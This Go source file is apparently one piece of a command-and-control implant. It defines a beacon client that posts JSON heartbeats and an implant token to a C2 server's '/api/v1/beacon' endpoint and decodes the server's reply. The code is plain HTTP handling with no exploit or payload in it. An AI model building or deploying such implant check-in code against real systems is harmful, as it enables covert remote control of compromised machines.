package beacon

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"
)

// Client communicates with the C2 server.
type Client struct {
	serverURL string
	token     string
	implantID string
	http      *http.Client
}

// NewClient creates a beacon client.
func NewClient(serverURL, token, implantID string) *Client {
	return &Client{
		serverURL: serverURL,
		token:     token,
		implantID: implantID,
		http: &http.Client{
			Timeout: 30 * time.Second,
		},
	}
}

// ImplantID returns the current implant ID.
func (c *Client) ImplantID() string { return c.implantID }

// Beacon sends a heartbeat and returns the server response.
func (c *Client) Beacon(hb *ImplantHeartbeat) (*BeaconResponse, error) {
	body, err := json.Marshal(hb)
	if err != nil {
		return nil, fmt.Errorf("marshal heartbeat: %w", err)
	}

	req, err := http.NewRequest(http.MethodPost, c.serverURL+"/api/v1/beacon", bytes.NewReader(body))
	if err != nil {
		return nil, fmt.Errorf("create request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("x-implant-token", c.token)

	resp, err := c.http.Do(req)
	if err != nil {
		return nil, fmt.Errorf("http do: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		raw, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("server responded %d: %s", resp.StatusCode, string(raw))
	}

	var br BeaconResponse
	if err := json.NewDecoder(resp.Body).Decode(&br); err != nil {
		return nil, fmt.Errorf("decode response: %w", err)
	}
	return &br, nil
}
